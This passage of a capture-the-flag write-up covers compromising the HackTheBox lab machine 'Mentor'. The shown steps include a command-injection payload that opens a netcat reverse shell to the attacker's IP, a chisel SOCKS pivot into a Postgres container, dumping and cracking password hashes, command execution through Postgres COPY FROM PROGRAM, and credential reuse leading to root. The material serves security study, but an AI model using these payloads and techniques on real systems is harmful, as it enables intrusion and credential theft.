curl -sX 'POST' \
  'http://api.mentorquotes.htb/admin/backup' \
  -H 'accept: application/json' \
  -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' \
  -H 'Content-Type: application/json'\
  -d '{"loc": "x", "path": "xx;nohup rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.130 4242 >/tmp/f &#"}'|jq .
```
```json
{
  "INFO": "Done!"
}
```
from nohup's man page, so now it won't crash the box every single time anymore:
```
nohup - run a command immune to hangups, with output to a non-tty
```

## Pivoting and further enumeration 
Looking around we can see that there's a postgres instance on the host:
```bash
/app/app # head db.py
import os

from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)
from sqlalchemy.sql import func
from databases import Database

# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")
```
```bash
/app/app # ip r
default via 172.22.0.1 dev eth0
172.22.0.0/16 dev eth0 scope link  src 172.22.0.3
```

So we of course don't have psql here in the container, but the container's file system isn't read only, so we should be able download something like chisel in there and smuggle traffic from our own box into the postgres instance on the host, through the container.
```bash

/app # nc -vz 172.22.0.1 5432
       nc -vz 172.22.0.1 5432
172.22.0.1 (172.22.0.1:5432) open
```
```bash
/app/app # which psql
/app/app # touch file
/app/app # which ssh
/app/app #
/dev/shm # wget --no-check-certificate https://10.10.14.134:9090/chisel_1.7.7_linux_amd64
```

I'm experimenting with chisel on my own network first, trying to make sense of the socks5 reverse proxying... this works: 
```bash
attacker # ./chisel server -p 4242 --socks5 --reverse
victim   # ./chisel client 192.168.0.73:4242 R:1080:socks
```
```bash
victim   # updog --port 4040
attacker # curl -x socks5://localhost:1080 http://127.0.0.1:4040 
attacker # proxychains curl http://127.0.0.1:4040 
```

lets try to do that on the machine now.
```bash
./chisel-arm server -p 4242 --socks5 --reverse
/app # ./chisel-amd client 10.10.14.130:4242 R:1080:socks
```

Looks like the client connection came through, so I should be able to use proxychains to talk to the postgress server now
```bash
proxychains nc -vz 172.22.0.1 5432
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.22.0.1:5432  ...  OK
172.22.0.1 [172.22.0.1] 5432 (postgresql) open : Operation now in progress
```

Nice, lets connect to it
```bash
proxychains -q psql -U postgres -W postgres --host 172.22.0.1
Password:
psql (15.2 (Debian 15.2-1), server 13.7 (Debian 13.7-1.pgdg110+1))
Type "help" for help.

```
```
postgres=# \setenv PAGER 'less -S'
postgres=# \l
                                                   List of databases
      Name       |  Owner   | Encoding |  Collate   |   Ctype    | ICU Locale | Locale Provider |   Access privileges
-----------------+----------+----------+------------+------------+------------+-----------------+-----------------------
 mentorquotes_db | postgres | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            |
 postgres        | postgres | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            |
 template0       | postgres | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | =c/postgres          +
                 |          |          |            |            |            |                 | postgres=CTc/postgres
 template1       | postgres | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | =c/postgres          +
                 |          |          |            |            |            |                 | postgres=CTc/postgres
(4 rows)

```

```bash
proxychains -q psql -U postgres -W postgres --host 172.22.0.1 -d mentorquotes_db
psql: warning: extra command-line argument "postgres" ignored
Password:
psql (15.2 (Debian 15.2-1), server 13.7 (Debian 13.7-1.pgdg110+1))
Type "help" for help.
```
```
mentorquotes_db=# \dt

          List of relations
 Schema |   Name   | Type  |  Owner
--------+----------+-------+----------
 public | cmd_exec | table | postgres
 public | quotes   | table | postgres
 public | users    | table | postgres
(3 rows)
```
```sql
mentorquotes_db=# select * from users;
 id |         email          |  username   |             password
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
(2 rows)
```

We already have james's password but we can try to feed the service account's hash into crackstation real quick, and we get a match
```
service_acc:123meunomeeivani
```

```bash
printf 123meunomeeivani|md5sum
53f22d0dfa10dce7e29cd31f4f953fd8  -
printf kj23sadkj123as0-d213|md5sum
7ccdcd8c05b59add9c198d492b36a503  -
```
```sql
 id |                 title                 |                                                                                                                                                                   >
----+---------------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------->
  1 |  I believed I was good                | I was so bad at studies in school. Teachers used to tell me that I should follow a different passion other than typical education. Nonetheless, I got rid of the n>
  2 | Find your passion before its too late | When I was growing up, I did not really have much, sure I enjoyed my passion but did not take it seriously. When I worked in a gas station for 3 years at that poi>
  3 | Never too late                        | I was a construction worker for almost 10 years. I had to work there because I did not have any educational background to work in the academic sector. But I reali>
  4 | Age is just a number                  | When I was was kid, I used to create very simple video games as a hobby. Because I loved it so much, I thought to myself that I am going to be a game developer so>
  5 | Its all worth it in the end           | Working as a school teacher, I had a lot of responsibilities to fulfill. Even though I really loved teaching kids, the pressure was unbearable. I had 10-hour shif>
(5 rows)
```
```sql
mentorquotes_db=# select * from cmd_exec;
                               cmd_output
------------------------------------------------------------------------
 uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)
(1 row)
```

Here's another cool trick on postgress from the ippsec video  
```sql
DROP table cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM program 'ls -la';
SELECT * FROM cmd_exec;
DELETE FROM cmd_exec WHERE cmd_output IS NOT NULL;
OP table cmd_exec;
```

This works because we're unning as superuser, in our case that would give us exec on the postgres container. but if the DB was on the host. that could have been interesting 
```
\du
                                   List of roles
 Role name |                         Attributes                         | Member of
-----------+------------------------------------------------------------+-----------
 postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS | {}
```

Using the socks proxy to scan the environment
```bash
proxychains -q nmap --min-rate 10000 127.0.0.1 -oN scans/nmap.alpine
PORT     STATE SERVICE
8000/tcp open  http-alt
```
```bash
proxychains -q nmap --min-rate 10000 172.22.0.1 -oN scans/nmap.alpine-host
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-12 10:21 GMT
Nmap scan report for 172.22.0.1
Host is up (0.100s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
81/tcp   open  hosts2-ns
5432/tcp open  postgresql
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 102.62 seconds
```

The password we got from `svc_acc` works with the `svc` user over ssh  

We're now the svc user on the actual host, and as we knew already, it's running docker, but our user doesn't have access:
```bash
svc@mentor:~$ netstat -tulpen
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      102        29979      -
tcp        0      0 172.22.0.1:81           0.0.0.0:*               LISTEN      0          36638      -
tcp        0      0 172.22.0.1:5432         0.0.0.0:*               LISTEN      0          34661      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          32752      -
tcp        0      0 127.0.0.1:42789         0.0.0.0:*               LISTEN      0          33910      -
tcp        0      0 172.22.0.1:8000         0.0.0.0:*               LISTEN      0          35174      -
tcp6       0      0 :::22                   :::*                    LISTEN      0          32754      -
tcp6       0      0 :::80                   :::*                    LISTEN      0          32804      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           102        29978      -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          31132      -
udp        0      0 0.0.0.0:161             0.0.0.0:*                           0          33892      -
udp6       0      0 ::1:161                 :::*                                0          33893      -
svc@mentor:~$ id
uid=1001(svc) gid=1001(svc) groups=1001(svc)
svc@mentor:~$ ls -la
total 56
drwxr-x--- 6 svc  svc  4096 Mar 12 11:10 .
drwxr-xr-x 4 root root 4096 Jun 10  2022 ..
lrwxrwxrwx 1 root root    9 Nov 10 14:28 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc  3771 Jun  7  2022 .bashrc
drwx------ 3 svc  svc  4096 Jun 12  2022 .cache
drwx------ 3 svc  svc  4096 Mar 12 11:04 .gnupg
-rw------- 1 svc  svc    20 Mar 12 10:51 .lesshst
drwxrwxr-x 5 svc  svc  4096 Jun 12  2022 .local
-rw-r--r-- 1 svc  svc   807 Jun  7  2022 .profile
-rw-rw-r-- 1 svc  svc    74 Mar 12 11:10 .selected_editor
drwx------ 3 svc  svc  4096 Mar 12 11:04 snap
-rw-r----- 1 root svc    33 Mar 12 09:43 user.txt
-rw------- 1 svc  svc  9878 Mar 12 11:03 .viminfo
```

After running linpeas, we find out that we have write access to `/home/svc/.local/bin` which is in svc's PATH, svc does not have any sudo access though, looking at pspy64 to see if we can catch something running as root like a cron of something from the api... API runs as root but from the container, so does the website on another container. 
```bash
svc@mentor:~$ echo $PATH
/home/svc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
svc@mentor:~$ sudo -l
[sudo] password for svc:
Sorry, user svc may not run sudo on mentor.
```

ippsec goes on about doing some date matching forensics, by saying that the server's ssh keys are generated at machine build time, so they give us a good idea of when the machine was generated.
Then we match files that were changed right after, so around when the box was configured.
```bash
find /etc -type f -newermt 2022-06-04 ! -newermt 2022-06-14 -ls 2>/dev/null|less -S
find /etc -type f -newermt 2022-06-04 ! -newermt 2022-06-14 -ls 2>/dev/null
   131800      4 -r--r-----   1 root     root         1695 Jun 10  2022 /etc/sudoers
   133738      4 -rw-r--r--   1 root     root          511 Jun  5  2022 /etc/snmp/snmp.conf
   139507      4 -rw-r--r--   1 root     root         3453 Jun  5  2022 /etc/snmp/snmpd.conf
   132870      4 -rw-r--r--   1 root     root           36 Jun 10  2022 /etc/subuid
   131797      4 -rw-r--r--   1 root     root           17 Jun 10  2022 /etc/subgid-
   133677      4 -rw-r--r--   1 root     root          158 Jun  7  2022 /etc/systemd/system/login.service
   133681      4 -rw-r--r--   1 root     root          148 Jun  7  2022 /etc/systemd/system/docker-startup.service
   133673      4 -rw-r--r--   1 root     root          285 Jun  7  2022 /etc/systemd/system/snap-core20-1518.mount
   133721      4 -rw-r--r--   1 root     root         1078 Jun  7  2022 /etc/ssl/certs/ssl-cert-snakeoil.pem
   133630     64 -rw-r--r--   1 root     root        63312 Jun 10  2022 /etc/udev/rules.d/70-snap.snapd.rules
   132106      4 -rw-r--r--   1 root     root           36 Jun 10  2022 /etc/subgid
   131753      4 -rw-r--r--   1 root     root           17 Jun 10  2022 /etc/subuid-

```

We find an snmp v3 password in the snmp config
```
grep -v ^# /etc/snmp/snmpd.conf|grep ^.
sysLocation    Sitting on the Dock of the Bay
sysContact     Me <admin@mentorquotes.htb>
sysServices    72
master  agentx
agentAddress udp:161,udp6:[::1]:161
view   systemonly  included   .1.3.6.1.2.1.1
view   systemonly  included   .1.3.6.1.2.1.25.1
rocommunity  public default -V systemonly
rocommunity6 public default -V systemonly
rouser authPrivUser authpriv -V systemonly
includeDir /etc/snmp/snmpd.conf.d
createUser bootstrap MD5 SuperSecurePassword123__ DES
rouser bootstrap priv
com2sec AllUser default internal
group AllGroup v2c AllUser
view SystemView included .1.3.6.1.2.1.25.1.1
view AllView included .1
access AllGroup "" any noauth exact AllView none none
```

There is no bootstrap user in the system, but this might have been reused, and it was been by james:
```bash
svc@mentor:~$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
svc:x:1001:1001:,,,:/home/svc:/bin/bash
james:x:1000:1000:,,,:/home/james:/bin/bash
svc@mentor:~$ su - james
Password:
james@mentor:~$ id
uid=1000(james) gid=1000(james) groups=1000(james)
james@mentor:~$ pwd
/home/james
james@mentor:~$ ls -la
total 20
drwxr-x--- 3 james james 4096 Nov 10 14:27 .
drwxr-xr-x 4 root  root  4096 Jun 10  2022 ..
lrwxrwxrwx 1 root  root     9 Nov 10 14:27 .bash_history -> /dev/null
-rw-r--r-- 1 james james 3771 Jun 10  2022 .bashrc
drwx------ 2 james james 4096 Jun 10  2022 .cache
-rw-r--r-- 1 james james  807 Jun 10  2022 .profile
```

James also does not have docker access but may sudo to /bin/sh as root
```bash
james@mentor:~$ sudo -l
[sudo] password for james:
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh
```
```bash
james@mentor:~$ sudo /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# pwd
/home/james
# cd
# pwd
/root
# ls -la
total 44
drwx------  7 root root 4096 Dec 12 10:25 .
drwxr-xr-x 19 root root 4096 Nov 10 16:00 ..
lrwxrwxrwx  1 root root    9 Nov 10 14:28 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  3 root root 4096 Jun  3  2022 .cache
drwxr-xr-x  3 root root 4096 Jun  3  2022 .local
-rw-r--r--  1 root root    0 Jun  7  2022 logins.log
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 Mar 12 11:27 root.txt
drwxr-xr-x  3 root root 4096 Jun 12  2022 scripts
drwx------  3 root root 4096 Jun  3  2022 snap
drwx------  2 root root 4096 Nov  8 12:13 .ssh
-rw-------  1 root root 2433 Dec 12 10:25 .viminfo
```
```bash
# docker ps
CONTAINER ID   IMAGE         COMMAND                  CREATED          STATUS          PORTS                       NAMES
3bce68c242fa   docker_web    "python main.py"         43 minutes ago   Up 43 minutes   172.22.0.1:81->80/tcp       docker_web_1
c26466ec1466   docker_api    "python3 -m uvicorn …"   43 minutes ago   Up 43 minutes   172.22.0.1:8000->8000/tcp   docker_api_1
96e44c569292   postgres:13   "docker-entrypoint.s…"   9 months ago     Up 43 minutes   172.22.0.1:5432->5432/tcp   docker_postgres_1
```
